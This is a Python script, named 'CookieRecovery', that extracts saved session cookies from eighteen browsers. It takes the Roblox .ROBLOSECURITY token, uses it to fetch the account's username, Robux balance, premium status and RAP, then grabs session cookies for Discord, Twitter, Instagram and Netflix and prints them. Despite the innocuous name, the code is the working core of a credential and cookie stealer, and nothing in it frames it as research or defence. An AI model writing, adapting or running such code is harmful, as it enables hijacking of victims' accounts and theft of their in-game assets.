import requests
import browser_cookie3
import robloxpy
import logging

logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

class CookieRecovery:

    DOMAINS = ["discord.com", "twitter.com", "instagram.com", "netflix.com"]

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Roblox/WinInet',
            'Referer': 'https://www.roblox.com/'
        })

    def _get_cookie(self, domain_name='roblox.com'):
        """Retrieve the cookie from supported browsers for a given domain."""
        browsers = ['firefox', 'chrome', 'chromium', 'edge', 'opera', 'vivaldi', 'brave', 'yandex', 'jbrowser', 'palemoon', 'waterfox', 'avast', 'slimjet', 'maxthon', 'comodo_dragon', 'comodo_icedragon', '360se', 'falkon']
        for browser in browsers:
            try:
                cookies = getattr(browser_cookie3, browser)(domain_name=domain_name)
                for cookie in cookies:
                    if domain_name == 'roblox.com' and cookie.name == '.ROBLOSECURITY':
                        return cookie.value
                    elif domain_name != 'roblox.com':
                        return {'name': cookie.name, 'value': cookie.value}
            except Exception:
                pass
        return None

    def _fetch_user_info(self, roblox_cookie):
        """Fetch user info from Roblox based on the cookie."""
        self.session.headers.update({'Cookie': f'.ROBLOSECURITY={roblox_cookie}'})
        try:
            response = self.session.get('https://www.roblox.com/mobileapi/userinfo')
            return response.json()
        except Exception as e:
            logging.error(f"Error retrieving user info: {e}")
            return None

    def _get_rap(self, user_id):
        """Retrieve the RAP value for the user."""
        try:
            return robloxpy.User.External.GetRAP(user_id)
        except Exception as e:
            logging.error(f"Error fetching RAP for user ID {user_id}: {e}")
            return 'Not available'

    def recover_data(self):
        roblox_cookie = self._get_cookie()
        if not roblox_cookie:
            logging.error("Roblox cookie retrieval failed.")
            return

        user_info = self._fetch_user_info(roblox_cookie)
        if not user_info:
            logging.error("Error retrieving Roblox user data.")
            return

        user_id = user_info.get("UserID")
        rap = self._get_rap(user_id) if user_id else 'Not available'

        # Displaying the Roblox data
        print("═" * 22 + " Roblox Account Details " + "═" * 22)
        print(f"🍪 Roblox Cookie: {roblox_cookie}")
        print(f"👤 Username: {user_info.get('UserName', 'Not available')}")
        print(f"💎 Premium: {user_info.get('IsPremium', 'Not available')}")
        print(f"🪪  ID: {user_id}")
        print(f"💰 Robux Balance: {user_info.get('RobuxBalance', 'Not available')}")
        print(f"💰 RAP: {rap}")
        print("═"*68)

        # Recovering data from other domains
        extra_cookies_found = False
        for domain in self.DOMAINS:
            if domain != 'roblox.com':
                cookies = self._get_cookie(domain_name=domain)
                if cookies:
                    if not extra_cookies_found:
                        extra_cookies_found = True
                    print(f"═" * 22 + f" Cookies for {domain} " + "═" * 22)
                    print(f"Name: {cookies['name']} | Value: {cookies['value']}")
                    print("═"*68)